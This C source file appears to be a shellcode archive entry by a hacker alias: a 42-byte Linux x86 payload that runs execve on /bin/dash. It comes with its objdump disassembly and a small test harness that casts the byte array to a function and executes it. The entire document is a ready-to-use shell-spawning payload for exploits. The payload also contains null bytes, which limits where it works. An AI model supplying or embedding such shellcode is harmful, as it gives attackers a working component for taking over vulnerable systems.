/*

linux/x86 execve(/bin/dash) 42 bytes
Author        : X-h4ck
                mem001@live.com, mem003@live.com
                www.pirate.al , www.flashcrew.in
Greetz        : mywisdom - Danzel - Wulns~ - IllyrianWarrior- Ace - M4yh3m - Saldeath
                ev1lut1on - Lekosta - Pretorian - bi0 - Slimshaddy - d3trimentaL
                CR - Hack-Down - H3ll - d4nte_sA - th3p0wer and all PirateAL friends.
PROUD TO BE ALBANIAN!
Linux bt 3.2.6 #1 SMP Fri Feb 17 10:40:05 EST 2012 i686 GNU/Linux

root@bt:~/Desktop# objdump -D sh

sh:     file format elf32-i386


Disassembly of section .text:

08048060 <.text>:
 8048060:    eb 19                    jmp    0x804807b
 8048062:    5b                       pop    %ebx
 8048063:    b8 00 00 00 00           mov    $0x0,%eax
 8048068:    88 43 09                 mov    %al,0x9(%ebx)
 804806b:    89 5b 0a                 mov    %ebx,0xa(%ebx)
 804806e:    89 43 0e                 mov    %eax,0xe(%ebx)
 8048071:    b0 0b                    mov    $0xb,%al
 8048073:    8d 4b 0a                 lea    0xa(%ebx),%ecx
 8048076:    8d 53 0e                 lea    0xe(%ebx),%edx
 8048079:    cd 80                    int    $0x80
 804807b:    e8 e2 ff ff ff           call   0x8048062
 8048080:    2f                       das
 8048081:    62 69 6e                 bound  %ebp,0x6e(%ecx)
 8048084:    2f                       das
 8048085:    64                       fs
 8048086:    61                       popa
 8048087:    73 68                    jae    0x80480f1

*/

#include <stdio.h>


char sc[] = "\xeb\x19\x5b\xb8\x00\x00\x00\x00\x88"
            "\x43\x09\x89\x5b\x0a\x89\x43\x0e\xb0"
            "\x0b\x8d\x4b\x0a\x8d\x53\x0e\xcd\x80"
            "\xe8\xe2\xff\xff\xff\x2f\x62\x69\x6e"
            "\x2f\x64\x61\x73\x68";
void main(void)
{
       void(*s)(void);
       printf("madhesia : %d\n", sizeof(sc));
       s = sc;
       s();
}